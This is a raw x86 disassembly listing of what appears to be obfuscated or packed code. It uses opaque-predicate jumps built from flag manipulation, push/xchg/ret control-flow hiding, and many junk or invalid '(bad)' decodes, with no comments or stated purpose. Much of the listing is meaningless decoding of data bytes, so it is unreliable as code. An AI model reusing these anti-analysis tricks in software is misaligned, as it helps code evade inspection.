  40b3a2:	ficomp WORD PTR [ecx+0x7c]
  40b3a5:	pop    ecx
  40b3a6:	xor    BYTE PTR [di+0x7eb5],0x4d
  40b3ac:	mov    esi,0x9c3c4b03
  40b3b1:	and    WORD PTR [esp],0xfe
  40b3b7:	popf   
  40b3b8:	jae    0x40c73e
  40b3be:	dec    ebx
  40b3bf:	and    DWORD PTR [ecx],esp
  40b3c1:	mov    ch,0xb5
  40b3c3:	adc    dh,al
  40b3c5:	loope  0x40b3cf
  40b3c7:	loope  0x40b3aa
  40b3c9:	(bad)  
  40b3ca:	scas   al,BYTE PTR es:[edi]
  40b3cb:	cs xor eax,0x6b0e22ac
  40b3d1:	ss ss jmp 0x40b9a1
  40b3d8:	mov    esi,0x5353fcd1
  40b3dd:	or     BYTE PTR [ebp-0x4a4adea7],dh
  40b3e3:	sbb    eax,0xe1b5844b
  40b3e8:	jl     0x40b379
  40b3ea:	out    0xcc,eax
  40b3ec:	int3   
  40b3ed:	int3   
	...
  40b406:	add    BYTE PTR [eax],al
  40b408:	add    BYTE PTR [edi+0x51],ch
  40b40b:	pushf  
  40b40c:	and    WORD PTR [esp],0xfe
  40b412:	popf   
  40b413:	jae    0x40e981
  40b419:	and    DWORD PTR [ecx-0x4b],ebx
  40b41c:	mov    ch,0xb5
  40b41e:	mov    esi,0x2184b5e1
  40b423:	mov    al,ds:0x21be4b4a
  40b428:	mov    ebp,0x9c6122f8
  40b42d:	and    WORD PTR [esp],0xfe
  40b433:	popf   
  40b434:	jae    0x40b1a7
  40b43a:	scas   al,BYTE PTR es:[edi]
  40b43b:	loope  0x40b3dd
  40b43d:	addr16 mov ch,0x7c
  40b440:	cs sub al,0x8
  40b443:	rol    esi,1
  40b445:	addr16 push ebx
  40b447:	scas   al,BYTE PTR es:[edi]
  40b448:	sub    al,0xab
  40b44a:	push   ecx
  40b44b:	cs cld 
  40b44d:	jmp    0x40f3d8
  40b452:	scas   al,BYTE PTR es:[edi]
  40b453:	mov    esi,0x5941412e
  40b458:	mov    al,ds:0x537c82b5
  40b45d:	jge    0x40b480
  40b45f:	or     dh,bl
  40b461:	xor    BYTE PTR [ebp-0x514a8171],0xd1
  40b468:	jo     0x40b47f
  40b46a:	daa    
  40b46b:	mov    ebx,0x6c64745e
  40b470:	push   esi
  40b471:	ds nop
  40b473:	ds mov esi,0x40b74b
  40b479:	cld    
  40b47a:	xchg   DWORD PTR [esp],esi
  40b47d:	nop
  40b47e:	ret    0x0
  40b481:	mov    ch,0xb5
  40b483:	push   ebx
  40b484:	jl     0x40b408
  40b486:	mov    ch,0xb5
  40b488:	cld    
  40b489:	test   eax,0x3e555f1a
  40b48e:	nop
  40b48f:	cld    
  40b490:	lea    ebp,ds:0x40e005
  40b496:	xchg   DWORD PTR ss:[esp],ebp
  40b49a:	cs ret 0x0
  40b49e:	adc    BYTE PTR cs:[ebp-0x4ab55f2f],dh
  40b4a5:	and    cl,0x21
  40b4a8:	adc    al,0x35
  40b4aa:	shr    esi,1
  40b4ac:	stos   BYTE PTR es:[edi],al
  40b4ad:	nop
  40b4ae:	nop
  40b4af:	cs jmp 0x40aeac
  40b4b5:	inc    ecx
  40b4b6:	mov    ch,0x14
  40b4b8:	or     BYTE PTR [edi+0x82ec621],cl
  40b4be:	ins    DWORD PTR es:[edi],dx
  40b4bf:	mov    ch,0x7c
  40b4c1:	mov    ch,0xb5
  40b4c3:	mov    ch,0x8
  40b4c5:	dec    edx
  40b4c6:	mov    al,ds:0x14be827e
  40b4cb:	add    eax,0xcccccce3
	...
  40b4e8:	add    BYTE PTR [eax],al
  40b4ea:	add    BYTE PTR [ebx+0x64],ch
  40b4ed:	mov    eax,DWORD PTR [eax]
  40b4ef:	cs ss cs jmp 0x40a29b
  40b4f7:	or     BYTE PTR [ecx+edx*8],dl
  40b4fa:	mov    ch,0x21
  40b4fc:	scas   al,BYTE PTR es:[edi]
  40b4fd:	mov    ch,0x6d
  40b4ff:	(bad)  
  40b500:	push   ebx
  40b501:	mov    esi,0xb5fc2e4a
  40b506:	cld    
  40b507:	and    ecx,edx
  40b509:	rcr    DWORD PTR ds:0x3ab867b8,1
  40b50f:	out    0x3e,al
  40b511:	outs   dx,DWORD PTR ds:[esi]
  40b512:	ss bnd jmp 0x40b9c2
  40b519:	adc    BYTE PTR [si-0x4b],bh
  40b51d:	mov    ch,0xbe
  40b51f:	sub    al,0x9f
  40b521:	sbb    eax,0x89fd14b
  40b526:	(bad)  
  40b527:	ins    DWORD PTR es:[edi],dx
  40b528:	and    esi,ebx
  40b52a:	test   BYTE PTR [edi+0xcccccc],bh
	...
  40b548:	add    BYTE PTR [eax],al
  40b54a:	div    ebx
  40b54c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b54d:	pushf  
  40b54e:	and    WORD PTR [esp],0xfe
  40b554:	popf   
  40b555:	jae    0x40c3d4
  40b55b:	mov    ch,0xd1
  40b55d:	test   BYTE PTR [ecx],ah
  40b55f:	mov    ch,0x10
  40b561:	and    DWORD PTR [ebp-0x4a51de61],esi
  40b567:	sub    al,0xe1
  40b569:	mov    bl,0xf
  40b56b:	mov    bh,0x4
  40b56d:	sub    bl,BYTE PTR [esi+eiz*2-0x1dbdb7f]
  40b574:	add    BYTE PTR [ebp+0x41e9830f],bl
  40b57a:	add    BYTE PTR [eax],al
  40b57c:	sbb    eax,0xc6b51d1d
  40b581:	sub    al,0x21
  40b583:	adc    BYTE PTR [ebp-0x3d4a2e52],dh
  40b589:	mov    DWORD PTR [esp+0x44],eax
  40b58d:	pushf  
  40b58e:	and    WORD PTR [esp],0xfe
  40b594:	popf   
  40b595:	jae    0x40bb6a
  40b59b:	mov    ch,0x8
  40b59d:	jle    0x40b570
  40b59f:	inc    ecx
  40b5a0:	and    esi,eax
  40b5a2:	addr16 mov ch,0x21
  40b5a5:	mov    esi,0x72ff1f21
  40b5aa:	push   eax
  40b5ab:	pause  
  40b5ad:	cs jmp 0x40f22f
  40b5b3:	mov    ch,0x8
  40b5b5:	push   ebx
  40b5b6:	mov    ch,0xb5
  40b5b8:	mov    ch,0x8f
  40b5ba:	mov    ch,0x84
  40b5bc:	mov    ch,0x21
  40b5be:	mov    ch,0xd1
  40b5c0:	sub    al,0x4a
  40b5c2:	mov    ch,0xc6
  40b5c4:	cs sbb eax,0xf726853c
  40b5ca:	icebp  
  40b5cb:	cs repz jmp 0x40b868
  40b5d2:	loope  0x40b5b2
  40b5d4:	push   ebx
  40b5d5:	(bad)  
  40b5d7:	mov    al,ds:0xde1dfcb5
  40b5dc:	xor    BYTE PTR [ebp+0x6db58267],0xb5
  40b5e3:	cs pop ecx
  40b5e5:	and    DWORD PTR [edi-0x7e],esp
  40b5e8:	test   eax,eax
  40b5ea:	ds ds ss jmp 0x40c9b6
  40b5f2:	ror    DWORD PTR [edx+0x21],1
  40b5f5:	mov    ch,0xe1
  40b5f7:	mov    ch,0xae
  40b5f9:	jge    0x40b5b0
  40b5fb:	sub    al,0x7d
  40b5fd:	fidiv  WORD PTR [ebp+0x14410821]
  40b603:	jge    0x40b587
  40b605:	and    BYTE PTR [esi-0x73],0x44
  40b609:	add    DWORD PTR [eax-0x64],ebx
  40b60c:	and    WORD PTR [esp],0xfe
  40b612:	popf   
  40b613:	jae    0x40b38d
  40b619:	jle    0x40b63c
  40b61b:	dec    ebx
  40b61c:	and    DWORD PTR [edi-0x7d4a5fec],ebx
  40b622:	jl     0x40b62c
  40b624:	jl     0x40b636
  40b626:	inc    ebp
  40b627:	mov    ds:0xf32e5653,eax
  40b62c:	repz lea esi,ds:0x40bff2
  40b633:	nop
  40b634:	xchg   DWORD PTR [esp],esi
  40b637:	bnd ret 0x0
  40b63b:	loope  0x40b651
  40b63d:	mov    ch,0x59
  40b63f:	mov    esi,0x5382c69f
  40b644:	pop    ecx
  40b645:	mov    al,ds:0x480c
  40b64a:	push   cs
  40b64b:	mov    eax,DWORD PTR [ecx+0x8]
  40b64e:	pushf  
  40b64f:	and    WORD PTR [esp],0xfe
  40b655:	popf   
  40b656:	jae    0x40aa29
  40b65c:	mov    al,ds:0x8217db5
  40b661:	and    DWORD PTR ds:0x8fde8408,ebx
  40b667:	mov    ch,0x7d
  40b669:	mov    dh,0xf
  40b66b:	test   bl,bh
  40b66d:	in     eax,dx
  40b66e:	(bad)  
  40b66f:	call   FWORD PTR [esi+eiz*2-0x1dbdb7f]
  40b676:	add    BYTE PTR [ebp+0x15d6830f],bl
  40b67c:	add    BYTE PTR [eax],al
  40b67e:	jge    0x40b6a1
  40b680:	push   ebx
  40b681:	cs jle 0x40b613
  40b684:	fidiv  WORD PTR [ebp-0x6e7ded2]
  40b68a:	sub    BYTE PTR [esi-0x75],bh
  40b68d:	repz ds cld 
  40b690:	jmp    0x40ddff
  40b695:	scas   al,BYTE PTR es:[edi]
  40b696:	dec    edx
  40b697:	shl    DWORD PTR [ebp+0x1d7e7d2c],1
  40b69d:	mov    dh,0xae
  40b6a0:	ins    DWORD PTR es:[di],dx
  40b6a2:	mov    ch,0x82
  40b6a4:	or     BYTE PTR [ebp-0x7039f72f],dh
  40b6aa:	or     al,0x4a
  40b6ac:	add    BYTE PTR [eax],al
  40b6ae:	sbb    ecx,DWORD PTR [ecx+0x362ee447]
  40b6b4:	jmp    0x40d41f
  40b6b9:	test   BYTE PTR [ebp+0x7c21147d],dh
  40b6bf:	cld    
  40b6c0:	dec    ebx
  40b6c1:	fimul  WORD PTR [eax]
  40b6c3:	and    DWORD PTR [edi+0x21],esp
  40b6c6:	loope  0x40b746
  40b6c8:	and    DWORD PTR [edx+0xe7c6d7c],eax
  40b6ce:	jne    0x40a6c4
  40b6d4:	cld    
  40b6d5:	ds jmp 0x40c414
  40b6db:	mov    al,ds:0x10c64b08
  40b6e0:	dec    edx
  40b6e1:	adc    BYTE PTR [ebp+0x21b5b5b5],dh
  40b6e7:	dec    edx
  40b6e8:	or     BYTE PTR [esi],ch
  40b6ea:	pop    ecx
  40b6eb:	fisubr WORD PTR [eax+0x46]
  40b6ee:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6f0:	bnd es jmp 0x40a8a3
  40b6f7:	jle    0x40b71a
  40b6f9:	mov    ch,0x21
  40b6fb:	jge    0x40b6de
  40b6fd:	and    DWORD PTR [eax+0x7cb5082e],esp
  40b703:	mov    ch,0x84
  40b705:	fisub  WORD PTR [ecx]
  40b707:	mov    ch,0xb5
  40b709:	addr16 lahf 
  40b70b:	mov    ch,0x66
  40b70d:	xor    eax,eax
  40b70f:	pushf  
  40b710:	and    WORD PTR [esp],0xfe
  40b716:	popf   
  40b717:	jae    0x40d8a0
  40b71d:	sbb    eax,0x21b57e7c
  40b722:	shr    DWORD PTR [ebp-0x1f],1
  40b725:	adc    al,0xa0
  40b727:	mov    ch,0x59
  40b729:	fimul  WORD PTR [eax]
  40b72b:	cmp    ebp,ecx
  40b72d:	inc    ebx
  40b72e:	adc    eax,DWORD PTR [eax]
  40b730:	add    BYTE PTR [esi+eiz*2-0x1dbdb7f],bl
  40b737:	add    BYTE PTR [ebp+0x1416830f],bl
  40b73d:	add    BYTE PTR [eax],al
  40b73f:	and    ecx,esp
  40b741:	or     BYTE PTR cs:[ebp+0x1d],bh
  40b745:	push   ebx
  40b746:	mov    ch,0x7c
  40b748:	mov    ch,0x53
  40b74a:	xlat   BYTE PTR ds:[ebx]
  40b74b:	mov    esi,0x6c642e5c
  40b750:	push   edx
  40b751:	cs pause 
  40b754:	mov    edx,0x40aaeb
  40b759:	cld    
  40b75a:	xchg   DWORD PTR [esp],edx
  40b75d:	repz ret 0x0
  40b761:	or     BYTE PTR [edi-0x4a1ef7d2],0x53
  40b768:	sub    al,0x85
  40b76a:	clc    
  40b76b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b76c:	mov    DWORD PTR [edi-0x10],eax
  40b76f:	pushf  
  40b770:	and    WORD PTR [esp],0xfe
  40b776:	popf   
  40b777:	jae    0x40b34f
  40b77d:	fidiv  WORD PTR [ebp-0x41f77b1f]
  40b783:	rcl    DWORD PTR [ecx+eiz*1],1
  40b786:	mov    ch,0xfc
  40b788:	adc    al,0x21
  40b78a:	out    dx,al
  40b78b:	mov    eax,DWORD PTR [ecx+0x3c]
  40b78e:	es nop
  40b790:	es jmp 0x40b607
  40b796:	(bad)  
  40b797:	push   ebx
  40b798:	mov    ch,0xfc
  40b79a:	cld    
  40b79b:	adc    BYTE PTR [ebp+0x7d],bh
  40b79e:	(bad)  
  40b79f:	lahf   
  40b7a0:	inc    ecx
  40b7a1:	mov    ch,0xa0
  40b7a3:	mov    ch,0xae
  40b7a5:	mov    esi,0x208b510
  40b7aa:	push   esi
  40b7ab:	push   esi
  40b7ac:	cld    
  40b7ad:	repz repnz mov esi,0x40ba66
  40b7b4:	xchg   DWORD PTR es:[esp],esi
  40b7b8:	es ret 0x0
  40b7bc:	dec    ebx
  40b7bd:	or     BYTE PTR [edi-0x71],ah
  40b7c0:	and    DWORD PTR [ebp+0x2108b510],esi
  40b7c6:	mov    ch,0x82
  40b7c8:	adc    al,BYTE PTR [ebx+0x669c02e9]
  40b7ce:	and    DWORD PTR [esp],0xf9d00fe
  40b7d5:	add    DWORD PTR [ecx+0x16],0x0
  40b7d9:	add    BYTE PTR [ebp-0x5f4a4ab5],dh
  40b7df:	mov    ch,0xb5
  40b7e1:	jge    0x40b860
  40b7e3:	(bad)  
  40b7e4:	ins    DWORD PTR es:[edi],dx
  40b7e5:	mov    al,ds:0x5160469f
  40b7ea:	cld    
  40b7eb:	ss es mov ecx,0x40cb36
  40b7f2:	cld    
  40b7f3:	xchg   DWORD PTR [esp],ecx
  40b7f6:	bnd ret 0x0
  40b7fa:	and    DWORD PTR [ebp-0x39925ff8],esi
  40b800:	(bad)  
  40b801:	and    DWORD PTR [ebp+0x5e594a41],esi
  40b807:	push   esp
  40b808:	pushf  
  40b809:	and    WORD PTR [esp],0xfe
  40b80f:	popf   
  40b810:	jae    0x40e792
  40b816:	mov    ch,0x53
  40b818:	pop    ecx
  40b819:	and    DWORD PTR [edx+eax*4-0x7c],edi
  40b81d:	fiadd  WORD PTR cs:[edi+eiz*2-0x4a92514b]
  40b825:	repnz push 0x0
  40b828:	pushf  
  40b829:	and    WORD PTR [esp],0xfe
  40b82f:	popf   
  40b830:	jae    0x40e6d3
  40b836:	dec    ebx
  40b837:	test   BYTE PTR [ebp+esi*4+0x6d],bh
  40b83b:	sbb    eax,0x21b582b5
  40b840:	mov    esi,0x51596784
  40b845:	cmp    DWORD PTR [eax+ebx*4-0x6e],ebx
  40b849:	not    DWORD PTR [esp]
  40b84c:	pause  
  40b84e:	es jmp 0x40b246
  40b854:	and    ecx,esp
  40b856:	sub    al,0xd1
  40b858:	mov    ch,0xb5
  40b85a:	adc    al,0x7c
  40b85c:	and    DWORD PTR [ebp+0x21],edi
  40b85f:	mov    ch,0xe1
  40b861:	mov    ch,0x4b
  40b863:	test   BYTE PTR [ecx+eiz*1],ch
  40b866:	push   ebx
  40b867:	lahf   
  40b868:	test   edx,edx
  40b86a:	es nop
  40b86c:	cs jmp 0x40ce3f
  40b872:	lahf   
  40b873:	dec    edx
  40b874:	and    DWORD PTR [edi-0x2e394a4b],ecx
  40b87a:	sbb    eax,0x7db56d7d
  40b87f:	cld    
  40b880:	mov    ch,0x84
  40b882:	mov    ch,0x8
  40b884:	dec    edx
  40b885:	mov    ch,0x7d
  40b887:	push   esp
  40b888:	inc    edx
  40b889:	int3   
  40b88a:	int3   
  40b88b:	int3   
	...
  40b8a4:	add    BYTE PTR [eax],al
  40b8a6:	add    BYTE PTR [edi],dh
  40b8a8:	mov    ecx,0x333facf4
  40b8ad:	push   ebp
  40b8ae:	es nop
  40b8b0:	lea    ebp,ds:0x40c856
  40b8b7:	cld    
  40b8b8:	xchg   DWORD PTR [esp],ebp
  40b8bb:	repz ret 0x0
  40b8bf:	pop    ecx
  40b8c0:	ins    DWORD PTR es:[edi],dx
  40b8c1:	and    DWORD PTR [ebp-0x42],edi
  40b8c4:	lahf   
  40b8c5:	dec    ebx
  40b8c6:	repz lea ecx,[ebp+0x28]
  40b8ca:	nop
  40b8cb:	repz es jmp 0x40e7d1
  40b8d2:	(bad)  
  40b8d3:	mov    ch,0x7c
  40b8d5:	cld    
  40b8d6:	fimul  WORD PTR [ebx-0x61]
  40b8d9:	mov    al,ds:0xae598f84
  40b8de:	sub    al,0xb5
  40b8e0:	and    BYTE PTR [ecx],0xd1
  40b8e3:	sub    al,0x82
  40b8e5:	or     edx,DWORD PTR [edx+0x36]
  40b8e8:	ss jmp 0x40d97c
  40b8ee:	mov    ch,0x21
  40b8f0:	mov    ch,0x4b
  40b8f2:	(bad)  
  40b8f3:	mov    ch,0xe1
  40b8f5:	ins    DWORD PTR es:[edi],dx
  40b8f6:	dec    edx
  40b8f7:	push   ebx
  40b8f8:	sub    al,0x7c
  40b8fa:	mov    ch,0xb5
  40b8fc:	jle    0x40b906
  40b8fe:	pop    ecx
  40b8ff:	(bad)  
  40b900:	mov    ch,0x67
  40b902:	or     BYTE PTR [ebp+0x2414f793],dh
  40b908:	nop
  40b909:	nop
  40b90a:	cs jmp 0x40b807
  40b910:	jl     0x40b926
  40b912:	or     BYTE PTR [edx-0x4b],0xae
  40b916:	cs mov ch,0x7e
  40b919:	scas   al,BYTE PTR es:[edi]
  40b91a:	cs mov ch,0x10
  40b91d:	cld    
  40b91e:	jl     0x40b8d5
  40b920:	mov    ch,0x41
  40b922:	mov    ch,0xea
  40b924:	popa   
  40b925:	pushf  
  40b926:	and    WORD PTR [esp],0xfe
  40b92c:	popf   
  40b92d:	jae    0x40e3ba
  40b933:	scas   al,BYTE PTR es:[edi]
  40b934:	mov    ch,0x6d
  40b936:	cld    
  40b937:	dec    ebx
  40b938:	mov    ch,0xb5
  40b93a:	scas   al,BYTE PTR es:[edi]
  40b93b:	mov    esi,0xb5b56db5
  40b940:	mov    ch,0xbe
  40b942:	inc    DWORD PTR [ebx+0x669c14c6]
  40b948:	and    DWORD PTR [esp],0xf9d00fe
  40b94f:	and    DWORD PTR [esi+0x5900002a],0x2c
  40b956:	mov    ch,0xc6
  40b958:	loope  0x40b918
  40b95a:	(bad)  
  40b95b:	and    DWORD PTR [ebp-0x41517dd2],esi
  40b961:	push   ecx
  40b962:	and    bh,BYTE PTR [ecx+0x6f30da65]
  40b968:	bnd cs jmp 0x40bb89
  40b96f:	lahf   
  40b970:	mov    ch,0x21
  40b972:	jge    0x40b945
  40b974:	mov    ch,0x14
  40b976:	sbb    eax,0x53fc08ae
  40b97b:	ins    DWORD PTR es:[edi],dx
  40b97c:	mov    ch,0xa0
  40b97e:	ins    DWORD PTR es:[edi],dx
  40b97f:	or     BYTE PTR [ebp+0x73840f9b],dh
  40b985:	sub    DWORD PTR [eax],eax
  40b987:	add    BYTE PTR [esi+eiz*2-0x1dbdb7f],bl
  40b98e:	add    BYTE PTR [ebp+0x56a830f],bl
  40b994:	add    BYTE PTR [eax],al
  40b996:	and    BYTE PTR [bx-0x4b],0xde
  40b99b:	ins    DWORD PTR es:[edi],dx
  40b99c:	lahf   
  40b99d:	scas   al,BYTE PTR es:[edi]
  40b99e:	mov    ch,0xde
  40b9a0:	mov    bh,0x3d
  40b9a2:	jmp    0x40b9eb
  40b9a4:	jp     0x40b9e1
  40b9a6:	ss nop
  40b9a8:	jmp    0x40ddc1
  40b9ad:	and    DWORD PTR [eax],ecx
  40b9af:	inc    ecx
  40b9b0:	and    DWORD PTR [eax+0x2108b54a],esp
  40b9b6:	mov    ch,0xd1
  40b9b8:	mov    ch,0x4b
  40b9ba:	push   ebx
  40b9bb:	scas   al,BYTE PTR es:[edi]
  40b9bc:	push   ebx
  40b9bd:	mov    ch,0x7d
  40b9bf:	sub    BYTE PTR [eax-0x4a],bl
  40b9c2:	xor    DWORD PTR [esp],eax
  40b9c5:	cs repz ss jmp 0x40cea7
  40b9cd:	mov    al,ds:0x2cb5b508
  40b9d2:	or     BYTE PTR [edx+0x6d],cl
  40b9d5:	and    DWORD PTR [ebp-0x4a705fe3],esi
  40b9db:	inc    ecx
  40b9dc:	adc    BYTE PTR [esi],ch
  40b9de:	mov    ch,0x7e
  40b9e0:	xor    eax,0x5142b035
  40b9e5:	nop
  40b9e6:	repnz bnd jmp 0x40dafd
  40b9ed:	lahf   
  40b9ee:	mov    ch,0xb5
  40b9f0:	cld    
  40b9f1:	mov    al,ds:0xb57d1db5
  40b9f6:	test   dh,bl
  40b9f8:	jge    0x40b9cb
  40b9fa:	jge    0x40b9b1
  40b9fc:	sub    al,0xb5
  40b9fe:	mov    al,ds:0x4541c641
  40ba03:	(bad)
  40ba06:	add    al,0x24
  40ba08:	ss es jmp 0x40b963
  40ba0f:	mov    ch,0x67
  40ba11:	mov    ch,0x4b
  40ba13:	ins    DWORD PTR es:[edi],dx
  40ba14:	scas   al,BYTE PTR es:[edi]
  40ba15:	mov    ch,0x21
  40ba17:	adc    BYTE PTR [eax],dl
  40ba19:	jge    0x40b9d0
  40ba1b:	push   ebx
  40ba1c:	mov    esi,0xb58fb57d
  40ba21:	jle    0x40b9d8
  40ba23:	and    BYTE PTR [eax],dh
  40ba25:	mov    ecx,0xcccccc1e
	...
  40ba42:	add    BYTE PTR [eax],al
  40ba44:	add    BYTE PTR [eax-0x32efc75],dl
  40ba4a:	es jmp 0x40e25e
  40ba50:	mov    ch,0x67
  40ba52:	inc    ecx
  40ba53:	mov    ch,0xfc
  40ba55:	adc    al,0xc6
  40ba57:	add    BYTE PTR [esi+ebp*4-0x6051a699],0xb5
  40ba5f:	sbb    eax,0x21b559b5
  40ba64:	mov    ch,0xca
  40ba66:	push   edi
  40ba67:	pushf  
  40ba68:	and    WORD PTR [esp],0xfe
  40ba6e:	popf   
  40ba6f:	jae    0x40a9a3
  40ba75:	and    DWORD PTR cs:[ecx],esp
  40ba78:	sub    al,0x4b
  40ba7a:	mov    ch,0x8f
  40ba7c:	or     BYTE PTR [ecx],ah
  40ba7e:	mov    ch,0x9f
  40ba80:	dec    ebx
  40ba81:	cld    
  40ba82:	mov    ch,0x10
  40ba84:	jne    0x40ba40
  40ba86:	mov    ecx,DWORD PTR [esi+0x3c]
  40ba89:	nop
  40ba8a:	ds cs jmp 0x40e495
  40ba91:	loope  0x40ba48
  40ba93:	faddp  st(6),st
  40ba95:	adc    al,0xae
  40ba97:	mov    ch,0xd1
  40ba99:	dec    edx
  40ba9a:	or     BYTE PTR [eax],cl
  40ba9c:	mov    ch,0x21
  40ba9e:	and    DWORD PTR [edx-0x51704a4b],eax
  40baa4:	test   eax,0x18758b03
  40baa9:	bnd ds jmp 0x40ab88
  40bab0:	cld    
  40bab1:	or     BYTE PTR [edi-0x4a21f73a],0xae
  40bab8:	mov    esi,0xa0b54a41
  40babd:	mov    BYTE PTR [edx+0x2e21ae4a],0x1d
  40bac4:	add    eax,0x51f303d3
  40bac9:	ds cld 
  40bacb:	lea    ecx,ss:0x40d63d
  40bad2:	xrelease xchg DWORD PTR [esp],ecx
  40bad6:	cld    
  40bad7:	ret    0x0
  40bada:	addr16 (bad) 
  40badc:	mov    ch,0x4b
  40bade:	ror    DWORD PTR [edx-0x60],1
  40bae1:	addr16 cs dec edx
  40bae4:	xor    al,0xed
  40bae6:	int    0x25
  40bae8:	push   ds
  40bae9:	push   eax
  40baea:	es ds repz jmp 0x40abc8
  40baf2:	fisub  WORD PTR [ecx]
  40baf4:	jge    0x40bb49
  40baf6:	(bad)  
  40baf7:	mov    ch,0xc6
  40baf9:	jge    0x40bb1c
  40bafb:	loope  0x40ba81
  40bafd:	jle    0x40bab4
  40baff:	cld    
  40bb00:	push   ebx
  40bb01:	ins    DWORD PTR es:[edi],dx
  40bb02:	(bad)  
  40bb03:	mov    ch,0xb5
  40bb05:	fidiv  WORD PTR [ebp+0xb947b4]
  40bb0b:	add    DWORD PTR [eax],eax
  40bb0d:	add    BYTE PTR [esi+eiz*2-0x1dbdb7f],bl
  40bb14:	add    BYTE PTR [ebp+0x7cf830f],bl
  40bb1a:	add    BYTE PTR [eax],al
  40bb1c:	adc    BYTE PTR [edi-0x212e213a],cl
  40bb22:	or     BYTE PTR [bx+si],0x53
  40bb26:	dec    edx
  40bb27:	cmp    BYTE PTR [ecx-0x2f],dl
  40bb2a:	call   0xb9c4caee
  40bb2f:	out    dx,eax
  40bb30:	(bad)  
  40bb31:	call   DWORD PTR [eax-0x4]
  40bb34:	ds cld 
  40bb36:	mov    eax,0x40a1b4
  40bb3b:	xchg   DWORD PTR ss:[esp],eax
  40bb3f:	ss ret 0x0
  40bb43:	sbb    eax,0x2108b5b5
  40bb48:	ins    DWORD PTR es:[edi],dx
  40bb49:	sub    al,0x3b
  40bb4b:	jne    0x40ec83
  40bb51:	cld    
  40bb52:	bnd ds jmp 0x40d6ba
  40bb59:	addr16 mov ch,0x67
  40bb5c:	push   ebx
  40bb5d:	sbb    eax,0xaeb5417e
  40bb62:	mov    ch,0xc6
  40bb64:	mov    ch,0x7d
  40bb66:	jge    0x40bb7c
  40bb68:	and    esi,edi
  40bb6a:	mov    eax,DWORD PTR [ebp+0x28]
  40bb6d:	nop
  40bb6e:	cs jmp 0x40af4b
  40bb74:	mov    ch,0x21
  40bb76:	faddp  st(6),st
  40bb78:	pop    ecx
  40bb79:	push   ebx
  40bb7a:	adc    al,0xfc
  40bb7c:	mov    ch,0x7c
  40bb7e:	mov    ch,0x21
  40bb80:	or     BYTE PTR [ebp+0x53b5b567],dh
  40bb86:	and    DWORD PTR [ebx+0x6a],ecx
  40bb89:	push   ecx
  40bb8a:	push   ecx
  40bb8b:	nop
  40bb8c:	cld    
  40bb8d:	repnz mov ecx,0x40afc9
  40bb93:	xacquire xchg DWORD PTR [esp],ecx
  40bb97:	repz ret 0x0
  40bb9b:	test   BYTE PTR ds:0xbea0,ch
  40bba0:	mov    ch,0xde
  40bba2:	mov    ch,0x1d
  40bba4:	push   ebx
  40bba5:	push   ebx
  40bba6:	mov    esi,0x14e83995
  40bbab:	std    
  40bbac:	out    0xf,al
  40bbae:	test   BYTE PTR [eax+0x3efffff1],ah
  40bbb4:	cs jmp 0x40a42d
  40bbba:	mov    ch,0xc6
  40bbbc:	pop    ecx
  40bbbd:	mov    ch,0xb5
  40bbbf:	(bad)  
  40bbc0:	and    DWORD PTR [ebp+0x7c9f6d9f],esi
  40bbc6:	sbb    eax,0x6d2110b5
  40bbcb:	add    ebp,DWORD PTR [esp+edi*8-0x57166fca]
  40bbd2:	add    BYTE PTR es:[eax],al
  40bbd5:	test   ah,bh
  40bbd7:	shr    DWORD PTR [esi],1
  40bbd9:	scas   al,BYTE PTR es:[edi]
  40bbda:	and    DWORD PTR cs:[esi],ebp
  40bbdd:	dec    edx
  40bbde:	mov    dh,0x21
  40bbe1:	jl     0x40bb83
  40bbe3:	sbb    eax,0x8410d1c6
  40bbe8:	mov    ch,0x1d
  40bbea:	bound  ebp,QWORD PTR [eax+0x75]
  40bbed:	cs fs ins BYTE PTR es:[edi],dx
  40bbf0:	pushf  
  40bbf1:	and    WORD PTR [esp],0xfe
  40bbf7:	popf   
  40bbf8:	jae    0x40de20
  40bbfe:	mov    ch,0xfc
  40bc00:	or     BYTE PTR [edi-0x5f5f4a42],cl
  40bc06:	and    DWORD PTR [ecx+0x4b],ebx
  40bc09:	mov    cs,WORD PTR [ebx+0x3ef252d0]
  40bc0f:	cld    
  40bc10:	mov    edx,0x40c8b8
  40bc15:	cld    
  40bc16:	xchg   DWORD PTR [esp],edx
  40bc19:	cs ret 0x0
  40bc1d:	loope  0x40bbcd
  40bc1f:	mov    ch,0x67
  40bc21:	scas   al,BYTE PTR es:[edi]
  40bc22:	adc    BYTE PTR [eax],cl
  40bc24:	cld    
  40bc25:	or     BYTE PTR [ebp-0x35ea1b7c],dh
  40bc2b:	jne    0x40a44c
  40bc31:	push   ebx
  40bc32:	repnz repnz lea ebx,cs:0x40e1e1
  40bc3b:	xchg   DWORD PTR es:[esp],ebx
  40bc3f:	nop
  40bc40:	ret    0x0
  40bc43:	test   BYTE PTR [ebp-0x4ad1391f],dh
  40bc49:	push   0xc44c
  40bc4e:	cld    
  40bc4f:	pop    edx
  40bc50:	mov    esi,DWORD PTR [esi+0x20]
  40bc53:	pushf  
  40bc54:	and    WORD PTR [esp],0xfe
  40bc5a:	popf   
  40bc5b:	jae    0x40b225
  40bc61:	mov    ch,0x4b
  40bc63:	adc    al,0x21
  40bc65:	and    esp,edi
  40bc67:	mov    ch,0xb5
  40bc69:	ror    DWORD PTR [edi+0x5208fcb5],1
  40bc6f:	shr    ecx,0x2
  40bc72:	pushf  
  40bc73:	and    WORD PTR [esp],0xfe
  40bc79:	popf   
  40bc7a:	jae    0x40f6bd
  40bc80:	jle    0x40bcc3
  40bc82:	sbb    eax,0xaec67eb5
  40bc87:	jl     0x40bc3e
  40bc89:	loope  0x40bca8
  40bc8b:	mov    ch,0x2c
  40bc8d:	jge    0x40bcc4
  40bc8f:	(bad)  
  40bc90:	mov    ecx,0xffff8b9c
  40bc95:	push   edx
  40bc96:	repz ds lea edx,es:0x40f1b2
  40bc9f:	nop
  40bca0:	xchg   DWORD PTR [esp],edx
  40bca3:	ss ret 0x0
  40bca7:	mov    ch,0xa0
  40bca9:	lahf   
  40bcaa:	lahf   
  40bcab:	lahf   
  40bcac:	rol    DWORD PTR [ecx+0x25],1
  40bcaf:	std    
  40bcb0:	xchg   esp,eax
  40bcb1:	fidivr WORD PTR [ecx+0x65]
  40bcb7:	push   ebp
  40bcb8:	cld    
  40bcb9:	cld    
  40bcba:	ss mov ebp,0x40b2cd
  40bcc0:	xchg   DWORD PTR es:[esp],ebp
  40bcc4:	cld    
